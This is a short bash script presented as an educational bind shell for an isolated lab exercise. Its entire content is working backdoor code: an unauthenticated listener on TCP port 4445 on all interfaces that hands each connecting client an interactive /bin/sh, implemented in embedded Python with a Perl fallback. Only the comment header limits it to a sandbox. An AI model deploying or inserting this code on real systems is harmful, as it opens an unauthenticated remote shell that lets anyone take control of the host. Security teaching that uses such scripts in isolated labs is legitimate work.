#!/bin/bash
# ==============================================================
# lab_bind.sh — EDUCATIONAL bind shell (isolated sandbox lab)
#
# Purpose : Capstone exercise — listens on TCP/4445 on all local
#           interfaces inside the isolated VM. The analyst host
#           connects to it over the host-only network.
# Uses python3 when available, falls back to perl (perl-base is
# present on every Debian installation).
# ==============================================================

PORT=4445

if command -v python3 >/dev/null 2>&1; then
    exec python3 - <<'PYEOF'
import socket, os

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 4445))
srv.listen(5)

while True:
    conn, addr = srv.accept()
    if os.fork() == 0:
        # child: wire the shell's stdin/stdout/stderr to the socket
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fileno(), 1)
        os.dup2(conn.fileno(), 2)
        os.execv("/bin/sh", ["sh", "-i"])
    conn.close()   # parent keeps listening
PYEOF
else
    exec perl -MIO::Socket::INET -e '
        $s = IO::Socket::INET->new(LocalPort => 4445, Listen => 5, ReuseAddr => 1)
            or die "bind failed: $!";
        while ($c = $s->accept()) {
            if (!fork()) {
                open(STDIN,  "<&" . $c->fileno());
                open(STDOUT, ">&" . $c->fileno());
                open(STDERR, ">&" . $c->fileno());
                exec("/bin/sh", "-i");
            }
            close($c);
        }'
fi
